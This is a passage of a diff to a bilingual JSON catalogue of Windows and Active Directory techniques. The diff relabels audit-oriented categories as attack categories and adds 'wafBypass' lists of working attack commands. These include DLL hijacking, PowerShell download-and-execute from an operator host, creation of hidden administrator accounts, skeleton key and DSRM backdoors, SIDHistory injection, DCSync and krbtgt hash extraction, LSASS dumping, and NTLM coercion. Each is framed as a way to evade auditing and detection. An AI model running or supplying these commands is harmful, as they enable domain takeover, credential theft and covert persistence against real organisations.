+          "command": "copy evil.dll \"C:\\Program Files\\SomeApp\\version.dll\"",
+          "description": {
+            "zh": "把恶意 DLL 以应用依赖名放入签名目录借宿主加载；宿主进程加载 version.dll 即成功。",
+            "en": "Place the DLL under an application dependency name in a signed directory; the host loading version.dll confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "PowerShell 反射式注入",
+            "en": "PowerShell Reflective Injection"
+          },
+          "command": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{LAB_OPERATOR_HOST}/i.ps1'); Invoke-ReflectivePEInjection -DLLPath C:\\Users\\Public\\evil.dll\"",
+          "description": {
+            "zh": "内存反射加载避免 LoadLibrary 与注册表痕迹；目标进程模块列表无 DLL 但功能生效即成功。",
+            "en": "Reflectively load in memory to avoid LoadLibrary and registry footprints; functionality working without the DLL listed in the process modules confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "persistence-backdoor-user",
@@ -5039,8 +6536,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "异常本地账号持久化审计",
-        "en": "Anomalous Local-Account Persistence Audit"
+        "zh": "账户与凭证后门",
+        "en": "Account & Credential Backdoors"
       },
       "prerequisites": [
         {
@@ -5144,7 +6641,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "PowerShell New-LocalUser",
+            "en": "PowerShell New-LocalUser"
+          },
+          "command": "powershell -NoProfile -Command \"New-LocalUser -Name svc_backup -Password (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force); Add-LocalGroupMember Administrators svc_backup\"",
+          "description": {
+            "zh": "规避 net.exe 命令行审计：cmdlet 建号并入组；本地用户清单出现即成功。",
+            "en": "Create and group the account via cmdlets to avoid net.exe command-line auditing; the account appearing in local users confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "WinNT ADSI 无痕建号",
+            "en": "WinNT ADSI Account Creation"
+          },
+          "command": "powershell -NoProfile -Command \"$c=[ADSI]'WinNT://localhost';$u=$c.Create('user','svc_backup');$u.SetPassword('P@ssw0rd');$u.SetInfo();$g=[ADSI]'WinNT://localhost/Administrators,group';$g.Add('WinNT://localhost/svc_backup,user')\"",
+          "description": {
+            "zh": "以目录服务接口替代命令行工具：无 net.exe 进程痕迹；ADSI 查询可见新号即成功。",
+            "en": "Create the account through the directory interface with no net.exe process; the new account visible via ADSI confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "服务风格账号伪装",
+            "en": "Service-Style Account Masquerade"
+          },
+          "command": "net user svc_backup P@ssw0rd /add /y & net user svc_backup /comment:\"Windows backup service account\" & net localgroup administrators svc_backup /add",
+          "description": {
+            "zh": "以服务风格命名加描述降低目视与清单告警；注释生效且入组即成功。",
+            "en": "A service-style name and comment lower inventory alerts; the comment applied plus group membership confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "persistence-hidden-user",
@@ -5161,8 +6693,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "隐藏账号与 SAM 异常审计",
-        "en": "Hidden-Account and SAM Anomaly Audit"
+        "zh": "账户与凭证后门",
+        "en": "Account & Credential Backdoors"
       },
       "prerequisites": [
         {
@@ -5266,7 +6798,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "SpecialAccounts 隐藏变体",
+            "en": "SpecialAccounts Hiding Variant"
+          },
+          "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hidden$ /t REG_DWORD /d 0",
+          "description": {
+            "zh": "在账号已建基础上写登录界面隐藏键：net user 枚举仍可见但登录屏不可见；键值存在且登录屏无该账号即成功。",
+            "en": "Write the logon-screen hiding key after account creation; the value present with the account absent from the logon UI confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "PowerShell 隐藏账号变体",
+            "en": "PowerShell Hidden-Account Variant"
+          },
+          "command": "powershell -NoProfile -Command \"New-LocalUser -Name 'MS_DEBUG$' -Password (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force); New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' -Name 'MS_DEBUG$' -Value 0 -PropertyType DWord\"",
+          "description": {
+            "zh": "cmdlet 建号并同步写隐藏键规避 net.exe 审计；用户清单含号但登录屏不显示即成功。",
+            "en": "Create and hide via cmdlets avoiding net.exe auditing; listed in inventory yet hidden at the logon screen confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "dsadd 域侧变体",
+            "en": "dsadd Domain-Side Variant"
+          },
+          "command": "dsadd user \"CN=debug$,CN=Users,DC={LAB_DOMAIN_DN}\" -pwd P@ssw0rd -desc \"kernel debug service\"",
+          "description": {
+            "zh": "以目录命令在域内建 $ 后缀账号并伪装描述；AD 用户对象出现即成功。",
+            "en": "Create the $-suffixed domain account with a decoy description via dsadd; the AD user object appearing confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "skeleton-key",
@@ -5283,8 +6850,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "Skeleton Key 域控完整性审计",
-        "en": "Skeleton Key Domain-Controller Integrity Audit"
+        "zh": "账户与凭证后门",
+        "en": "Account & Credential Backdoors"
       },
       "prerequisites": [
         {
@@ -5388,7 +6955,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "内存加载无文件变体",
+            "en": "In-Memory Fileless Variant"
+          },
+          "command": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{LAB_OPERATOR_HOST}/i.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'\"",
+          "description": {
+            "zh": "规避 mimikatz.exe 落盘与进程特征：PowerShell 内存执行注入骨架密钥；用任意口令通过域认证即成功。",
+            "en": "Inject the skeleton key from memory via PowerShell to avoid on-disk mimikatz signatures; domain auth succeeding with any password confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "内联程序集执行变体",
+            "en": "Inline-Assembly Execution Variant"
+          },
+          "command": "execute-assembly /tools/SafetyKatz.exe \"privilege::debug\" \"misc::skeleton\"",
+          "description": {
+            "zh": "以 .NET 内联方式在代理进程内执行：无独立工具进程；注入后 mimikatz 口令可登录即成功。",
+            "en": "Run the .NET variant in-process with no standalone tool process; the default skeleton password authenticating afterwards confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "WMI 远程触发变体",
+            "en": "WMI Remote Trigger Variant"
+          },
+          "command": "wmic /node:{DC_HOST} process call create \"cmd /c C:\\Users\\Public\\mimikatz.exe \\\"privilege::debug\\\" \\\"misc::skeleton\\\" \\\"exit\\\"\"",
+          "description": {
+            "zh": "操作机不落工具，远程 WMI 在域控触发；进程创建返回 PID 且骨架口令可登录即成功。",
+            "en": "Trigger remotely via WMI keeping the operator host clean; a returned PID plus working skeleton password confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "dsrm-backdoor",
@@ -5405,8 +7007,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "DSRM 配置与登录行为审计",
-        "en": "DSRM Configuration and Logon-Behavior Audit"
+        "zh": "账户与凭证后门",
+        "en": "Account & Credential Backdoors"
       },
       "prerequisites": [
         {
@@ -5524,7 +7126,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "ntdsutil 原生改密变体",
+            "en": "ntdsutil Native Password Reset"
+          },
+          "command": "ntdsutil \"set dsrm password\" \"reset password on server null\" \"P@ssw0rd\" \"P@ssw0rd\" quit quit",
+          "description": {
+            "zh": "用目录工具原生接口重置 DSRM 密码规避 mimikatz 特征；返回 success 即后门口令生效。",
+            "en": "Reset the DSRM password via the native directory tool past mimikatz signatures; a returned success confirms the backdoor password."
+          }
+        },
+        {
+          "title": {
+            "zh": "DSRM 网络登录开关",
+            "en": "DSRM Network Logon Switch"
+          },
+          "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2",
+          "description": {
+            "zh": "改注册表允许 DSRM 账户远程登录替代本地控制台路径；值生效后网络登录成功即成功。",
+            "en": "Enable remote DSRM logon via the registry switch instead of the local console path; successful network logon after the value applies confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "离线 SAM 提取变体",
+            "en": "Offline SAM Extraction Variant"
+          },
+          "command": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL | grep -i \":500\"",
+          "description": {
+            "zh": "对已落地注册表蜂巢离线解析 RID 500 即 DSRM 账户哈希；输出行即成功。",
+            "en": "Parse a landed registry hive offline; the RID-500 line output yields the DSRM account hash, confirming success."
+          }
+        }
+      ]
     },
     {
       "id": "sid-history",
@@ -5541,8 +7178,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "SIDHistory 授权基线审计",
-        "en": "SIDHistory Authorization-Baseline Audit"
+        "zh": "账户与凭证后门",
+        "en": "Account & Credential Backdoors"
       },
       "prerequisites": [
         {
@@ -5646,7 +7283,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "DSInternals Add-ADSidHistory",
+            "en": "DSInternals Add-ADSidHistory"
+          },
+          "command": "powershell -NoProfile -Command \"Add-ADSidHistory -Identity svc_backup -SourceDomain {LAB_DOMAIN} -SourceIdentity Administrator\"",
+          "description": {
+            "zh": "以目录管理模块替代 mimikatz sid::add 特征；目标用户 sIDHistory 查询回显管理员 SID 即成功。",
+            "en": "Append via the directory admin module instead of mimikatz sid::add; the target user's sIDHistory echoing the admin SID confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "LDAP 直改属性变体",
+            "en": "Direct LDAP Attribute Write"
+          },
+          "command": "powershell -NoProfile -Command \"$u=[ADSI]'LDAP://CN=svc_backup,CN=Users,{LAB_DOMAIN_DN}';$u.Properties['sIDHistory'].Add((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-21-1004336348-1177238915-682003330-500')).Value);$u.CommitChanges()\"",
+          "description": {
+            "zh": "以 .NET 目录对象直写历史 SID 绕过工具签名；CommitChanges 后属性可见即成功。",
+            "en": "Write the historical SID through a raw .NET directory object bypassing tool signatures; the attribute visible after CommitChanges confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "SID 直值注入变体",
+            "en": "Direct SID Value Injection"
+          },
+          "command": "mimikatz # sid::add /sam:svc_backup /new:S-1-5-21-1004336348-1177238915-682003330-512",
+          "description": {
+            "zh": "以完整 SID 字符串替代账户名解析注入域管组历史 SID；whoami /all 显示历史 SID 即成功。",
+            "en": "Inject the full SID string instead of resolving an account name; whoami /all showing the historical SID confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "persistence-process-hollowing",
@@ -5663,8 +7335,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "进程镂空遥测与内存审计",
-        "en": "Process-Hollowing Telemetry and Memory Audit"
+        "zh": "代码级植入与注入",
+        "en": "Code-level Implants & Injection"
       },
       "prerequisites": [
         {
@@ -5768,7 +7440,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "wevtutil 原生查询变体",
+            "en": "wevtutil Native Query Variant"
+          },
+          "command": "wevtutil qe Microsoft-Windows-Sysmon/Operational \"/q:*[System[(EventID=1 or EventID=7 or EventID=10)]]\" /c:20 /rd:true /f:text",
+          "description": {
+            "zh": "规避 PowerShell 日志依赖：系统原生事件工具查询 Sysmon 关键事件；返回事件文本即成功。",
+            "en": "Query key Sysmon events with the native event tool, avoiding PowerShell logging dependencies; returned event text confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "Security 4688 对照变体",
+            "en": "Security 4688 Cross-Check Variant"
+          },
+          "command": "powershell -NoProfile -Command \"Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 20 | Format-List TimeCreated,Message\"",
+          "description": {
+            "zh": "以进程创建审计事件对照 Sysmon 遥测缺口；返回 4688 事件即具备对照基线。",
+            "en": "Cross-check telemetry gaps with process-creation audit events; returned 4688 events establish the comparison baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "Sysmon 配置核对变体",
+            "en": "Sysmon Config Verification Variant"
+          },
+          "command": "sysmon64.exe -s | findstr /i \"CreateRemoteThread ProcessAccess LoadImage\"",
+          "description": {
+            "zh": "直接导出当前 Sysmon 配置核对镂空相关规则覆盖；输出含对应事件 ID 即规则生效。",
+            "en": "Dump the live Sysmon config to verify hollowing-relevant rule coverage; the relevant event IDs present confirm active rules."
+          }
+        }
+      ]
     },
     {
       "id": "domain-privilege-escalation",
@@ -5785,8 +7492,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "AD 权限路径与提权链验证",
-        "en": "AD Privilege-Path and Escalation-Chain Validation"
+        "zh": "委派与 ACL 滥用",
+        "en": "Delegation & ACL Abuse"
       },
       "prerequisites": [
         {
@@ -5918,7 +7625,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "原生 ldapsearch 替代采集",
+            "en": "Native ldapsearch Collection"
+          },
+          "command": "ldapsearch -x -H ldap://{DC_HOST} -D '{LAB_DOMAIN}\\\\{LAB_USER}' -w '{LAB_PASSWORD}' -b '{LAB_DOMAIN_DN}' '(&(objectClass=group)(cn=*admin*))' member",
+          "description": {
+            "zh": "规避 SharpHound/Neo4j 工具特征：用系统 ldapsearch 原生导出高价值组关系；返回 member 记录即获得提权路径线索。",
+            "en": "Avoid SharpHound/Neo4j tooling signatures by enumerating high-value group membership with native ldapsearch; returned member records yield escalation-path leads."
+          }
+        },
+        {
+          "title": {
+            "zh": ".NET DirectorySearcher 原生枚举",
+            "en": ".NET DirectorySearcher Enumeration"
+          },
+          "command": "powershell -NoProfile -Command \"$s=New-Object System.DirectoryServices.DirectorySearcher('(&(adminCount=1)(objectClass=user))');$s.PageSize=100;$s.FindAll() | ForEach-Object {$_.Properties['name']}\"",
+          "description": {
+            "zh": "规避 PowerView 模块与脚本块日志：直接 .NET 目录搜索枚举 adminCount 标记账户；输出账户清单即成功。",
+            "en": "Enumerate adminCount-flagged accounts via raw .NET directory search, avoiding PowerView modules and script-block logging; an account list output confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "bloodhound-python 远程采集",
+            "en": "bloodhound-python Remote Collection"
+          },
+          "command": "bloodhound-python -d {LAB_DOMAIN} -u {LAB_USER} -p '{LAB_PASSWORD}' -dc {DC_HOST} -c All --zip",
+          "description": {
+            "zh": "规避 Windows 侧 PowerShell 采集痕迹：Linux 远程 LDAP/SMB 采集域信息；生成 zip 即成功。",
+            "en": "Collect domain data from Linux over LDAP/SMB, avoiding Windows-side PowerShell traces; a produced zip confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "domain-cross-trust",
@@ -5935,8 +7677,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "AD 跨域信任配置审计",
-        "en": "AD Cross-Domain Trust Configuration Audit"
+        "zh": "目录复制与跨域信任",
+        "en": "Replication & Cross-Domain Trust"
       },
       "prerequisites": [
         {
@@ -6054,7 +7796,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "nltest 原生命令替代",
+            "en": "nltest Native Alternative"
+          },
+          "command": "nltest /domain_trusts /all_trusts /server:{DC_HOST}",
+          "description": {
+            "zh": "规避 PowerView/DSInternals 模块特征：系统自带 nltest 枚举全部信任；输出信任域清单即成功。",
+            "en": "Enumerate trusts with the built-in nltest instead of PowerView modules; a trust list output confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "LDAP 直查 trustedDomain",
+            "en": "Direct LDAP trustedDomain Query"
+          },
+          "command": "ldapsearch -x -H ldap://{DC_HOST} -D '{LAB_DOMAIN}\\\\{LAB_USER}' -w '{LAB_PASSWORD}' -b 'CN=System,{LAB_DOMAIN_DN}' '(objectClass=trustedDomain)' cn trustPartner trustDirection",
+          "description": {
+            "zh": "规避对 PowerShell 域枚举的监控：直接 LDAP 查询信任对象属性；返回 trustPartner 即成功。",
+            "en": "Query trust objects directly over LDAP to bypass PowerShell domain-enumeration monitoring; returned trustPartner values confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "AD 模块 Get-ADTrust 变体",
+            "en": "AD Module Get-ADTrust Variant"
+          },
+          "command": "powershell -NoProfile -Command \"Import-Module ActiveDirectory; Get-ADTrust -Filter * | Select-Object Name,TrustType,Direction,IntraForest\"",
+          "description": {
+            "zh": "以官方管理模块替代攻击框架特征：RSAT ActiveDirectory 模块属于运维常态流量；输出信任矩阵即成功。",
+            "en": "Use the RSAT ActiveDirectory module, blending with routine admin traffic; an output trust matrix confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "dcsync-attack",
@@ -6071,8 +7848,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "DCSync 复制权限审计",
-        "en": "DCSync Replication-Permission Audit"
+        "zh": "目录复制与跨域信任",
+        "en": "Replication & Cross-Domain Trust"
       },
       "prerequisites": [
         {
@@ -6190,7 +7967,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "impacket secretsdump 替代",
+            "en": "impacket secretsdump Alternative"
+          },
+          "command": "impacket-secretsdump '{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}'@{DC_HOST} -just-dc-user krbtgt",
+          "description": {
+            "zh": "规避 mimikatz 进程与特征：Linux 侧远程 DCSync 仅取 krbtgt；输出 NTLM/AES 哈希即成功。",
+            "en": "Avoid mimikatz process signatures by pulling only krbtgt via remote DCSync from Linux; output NTLM/AES hashes confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "ntdsutil IFM 原生转储",
+            "en": "ntdsutil IFM Native Dump"
+          },
+          "command": "ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ifm\" quit quit",
+          "description": {
+            "zh": "规避 DRSUAPI 网络复制审计：用域控原生 IFM 备份落地 ntds.dit；目录中出现数据库文件即成功。",
+            "en": "Land ntds.dit via the DC-native IFM backup instead of DRSUAPI network replication; the database file appearing in the directory confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "DSInternals PowerShell 复制",
+            "en": "DSInternals PowerShell Replication"
+          },
+          "command": "powershell -NoProfile -Command \"Get-ADReplAccount -SamAccountName krbtgt -Domain {LAB_DOMAIN} -Server {DC_HOST}\"",
+          "description": {
+            "zh": "以目录复制 API 的管理模块替代 mimikatz：输出含krbtgt 哈希字段即成功。",
+            "en": "Pull the hash through the replication-API admin module instead of mimikatz; output containing krbtgt hash fields confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "golden-ticket",
@@ -6207,8 +8019,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "黄金票据前置条件与检测审计",
-        "en": "Golden-Ticket Preconditions and Detection Audit"
+        "zh": "Kerberos 票据攻击",
+        "en": "Kerberos Ticket Attacks"
       },
       "prerequisites": [
         {
@@ -6326,7 +8138,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "impacket 远程提取 krbtgt",
+            "en": "impacket Remote krbtgt Extraction"
+          },
+          "command": "impacket-secretsdump '{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}'@{DC_HOST} -just-dc-user krbtgt",
+          "description": {
+            "zh": "规避 mimikatz lsadump 特征与本地落地：远程仅提取 krbtgt 哈希；输出 krbtgt NTLM 即黄金票据前提成立。",
+            "en": "Extract only the krbtgt hash remotely, avoiding mimikatz lsadump signatures and local file drops; output krbtgt NTLM confirms the golden-ticket prerequisite."
+          }
+        },
+        {
+          "title": {
+            "zh": "DSInternals 离线复制提取",
+            "en": "DSInternals Offline Replication"
+          },
+          "command": "powershell -NoProfile -Command \"Get-ADReplAccount -SamAccountName krbtgt -Domain {LAB_DOMAIN} -Server {DC_HOST} -Credential {LAB_DOMAIN}\\\\{LAB_USER}\"",
+          "description": {
+            "zh": "以管理模块走复制协议取哈希，避开敏感工具进程告警；输出 SupplementalCredentials 即成功。",
+            "en": "Fetch the hash over the replication protocol via an admin module, dodging sensitive-tool process alerts; SupplementalCredentials output confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "ntds.dit 离线解析",
+            "en": "Offline ntds.dit Parsing"
+          },
+          "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | grep -i krbtgt",
+          "description": {
+            "zh": "规避与域控的任何交互：对已落地快照离线解析；输出 krbtgt 行即成功。",
+            "en": "Parse an already-landed snapshot offline with zero DC interaction; a krbtgt line in the output confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "silver-ticket",
@@ -6343,8 +8190,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "白银票据前置条件与检测审计",
-        "en": "Silver-Ticket Preconditions and Detection Audit"
+        "zh": "Kerberos 票据攻击",
+        "en": "Kerberos Ticket Attacks"
       },
       "prerequisites": [
         {
@@ -6448,7 +8295,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "comsvcs MiniDump 原生转储",
+            "en": "comsvcs MiniDump Native Dump"
+          },
+          "command": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\ls.dmp full\npypykatz lsa minidump C:\\Windows\\Temp\\ls.dmp",
+          "description": {
+            "zh": "规避 mimikatz 直接读取 LSASS 的特征：系统 DLL 做转储再离线解析；解析出服务账户 NTLM 即成功。",
+            "en": "Dump LSASS via the system DLL then parse offline, avoiding direct mimikatz LSASS access; parsed service NTLM hashes confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "Sysinternals procdump 变体",
+            "en": "Sysinternals procdump Variant"
+          },
+          "command": "procdump -accepteula -ma lsass.exe C:\\Windows\\Temp\\ls.dmp\nmimikatz \"sekurlsa::minidump ls.dmp\" \"sekurlsa::logonpasswords\" \"exit\"",
+          "description": {
+            "zh": "规避对 procdump 之外转储工具的封锁：签名工具转储离线解析；提取到服务凭据即成功。",
+            "en": "Dump with the signed Sysinternals tool and parse offline past dumper blocklists; extracted service credentials confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "内存加载无文件执行",
+            "en": "In-Memory Fileless Execution"
+          },
+          "command": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{LAB_OPERATOR_HOST}/i.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'\"",
+          "description": {
+            "zh": "规避磁盘落地与命令行特征：内存加载凭据提取；输出服务会话凭据即成功。",
+            "en": "Load the credential dump in memory to avoid disk artifacts and command-line signatures; output service-session credentials confirm success."
+          }
+        }
+      ]
     },
     {
       "id": "zerologon",
@@ -6465,8 +8347,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "Zerologon 补丁与协议配置审计",
-        "en": "Zerologon Patch and Protocol Configuration Audit"
+        "zh": "域控漏洞与已知利用链",
+        "en": "DC Vulnerabilities & Known Exploit Chains"
       },
       "prerequisites": [
         {
@@ -6584,7 +8466,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "补丁级别审计变体",
+            "en": "Patch-Level Audit Variant"
+          },
+          "command": "wmic qfe get HotFixID,InstalledOn | findstr /i \"4571694 4571723 4571748\"",
+          "description": {
+            "zh": "零网络爆破噪声：纯补丁枚举判定 Zerologon 修复状态；未列出对应 KB 即存在风险面。",
+            "en": "Determine patch state purely via KB enumeration with zero network brute-force noise; missing KBs indicate the exposed surface."
+          }
+        },
+        {
+          "title": {
+            "zh": "RPC 端点指纹替代",
+            "en": "RPC Endpoint Fingerprint Alternative"
+          },
+          "command": "rpcdump.py {DC_IP} | grep -iE \"MS-NRPC|Netlogon\"",
+          "description": {
+            "zh": "以端点枚举替代认证爆破探测 Netlogon 面；输出 MS-NRPC UUID 即接口可达。",
+            "en": "Probe the Netlogon surface via endpoint enumeration instead of auth brute force; printed MS-NRPC UUIDs confirm interface reachability."
+          }
+        },
+        {
+          "title": {
+            "zh": "注册表签名策略审计",
+            "en": "Registry Signing Policy Audit"
+          },
+          "command": "powershell -NoProfile -Command \"Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters' | Select-Object RequireSignOrSeal,SignSecureChannel\"",
+          "description": {
+            "zh": "完全离线检查通道签名强制配置；RequireSignOrSeal 为 0 或缺省即防御未强制。",
+            "en": "Fully offline check of channel-signing enforcement; RequireSignOrSeal at 0 or absent confirms the defense is not enforced."
+          }
+        }
+      ]
     },
     {
       "id": "printnightmare",
@@ -6601,8 +8518,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "PrintNightmare 暴露面与补丁审计",
-        "en": "PrintNightmare Exposure and Patch Audit"
+        "zh": "域控漏洞与已知利用链",
+        "en": "DC Vulnerabilities & Known Exploit Chains"
       },
       "prerequisites": [
         {
@@ -6706,7 +8623,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "远端 Spooler 服务探测",
+            "en": "Remote Spooler Service Probe"
+          },
+          "command": "powershell -NoProfile -Command \"Invoke-Command -ComputerName {DC_HOST} -ScriptBlock { Get-Service Spooler }\"",
+          "description": {
+            "zh": "以标准 PowerShell 远程管理替代 RPC 指纹工具；Status 为 Running 即打印服务暴露。",
+            "en": "Use standard PowerShell remoting instead of RPC fingerprinting tools; a Running Spooler status confirms exposure."
+          }
+        },
+        {
+          "title": {
+            "zh": "CME Spooler 探测",
+            "en": "CME Spooler Probe"
+          },
+          "command": "crackmapexec smb {DC_HOST} -u '{LAB_USER}' -p '{LAB_PASSWORD}' --spooler",
+          "description": {
+            "zh": "以凭据化 SMB 管理扫描替代匿名 rpcdump；输出 Spooler service enabled 即成功。",
+            "en": "Replace anonymous rpcdump with credentialed SMB scanning; \"Spooler service enabled\" output confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "PrintNightmare 补丁审计",
+            "en": "PrintNightmare Patch Audit"
+          },
+          "command": "wmic qfe get HotFixID | findstr /i \"5005001 5004954 5005565\"",
+          "description": {
+            "zh": "零利用尝试判定补丁状态；未列出对应 KB 即存在可利用面。",
+            "en": "Determine patch state with zero exploitation attempts; missing KBs confirm an exploitable surface."
+          }
+        }
+      ]
     },
     {
       "id": "petitpotam",
@@ -6723,8 +8675,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "PetitPotam/EFSRPC 暴露审计",
-        "en": "PetitPotam and EFSRPC Exposure Audit"
+        "zh": "域控漏洞与已知利用链",
+        "en": "DC Vulnerabilities & Known Exploit Chains"
       },
       "prerequisites": [
         {
@@ -6842,7 +8794,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "PrinterBug 触发路径",
+            "en": "PrinterBug Trigger Path"
+          },
+          "command": "printerbug.py '{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}'@{TARGET_HOST} {LAB_OPERATOR_HOST}",
+          "description": {
+            "zh": "绕过对 EFSRPC(UUID e351) 调用的监控：改走 MS-RPRN 打印机路径触发认证；relay 端收到 NTLM 即成功。",
+            "en": "Trigger via the MS-RPRN printer path to bypass EFSRPC UUID monitoring; NTLM arriving at the relay confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "DFSCoerce 触发路径",
+            "en": "DFSCoerce Trigger Path"
+          },
+          "command": "dfscoerce.py -d {LAB_DOMAIN} -u {LAB_USER} -p '{LAB_PASSWORD}' {LAB_OPERATOR_HOST} {TARGET_HOST}",
+          "description": {
+            "zh": "换用 MS-DFSNM 删除副本根路径强制出站认证；监听端收到认证请求即成功。",
+            "en": "Coerce via the DFS-NM standby-root removal path instead; an auth request reaching the listener confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "ShadowCoerce 触发路径",
+            "en": "ShadowCoerce Trigger Path"
+          },
+          "command": "shadowcoerce.py -d {LAB_DOMAIN} -u {LAB_USER} -p '{LAB_PASSWORD}' {LAB_OPERATOR_HOST} {TARGET_HOST}",
+          "description": {
+            "zh": "换用 MS-SRVS 共享枚举路径触发同样的 coerced auth；relay 捕获凭据即成功。",
+            "en": "Coerce via the MS-SRVS share enumeration path; the relay capturing credentials confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "samaccountname",
@@ -6859,8 +8846,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "sAMAccountName/PAC 补丁边界审计",
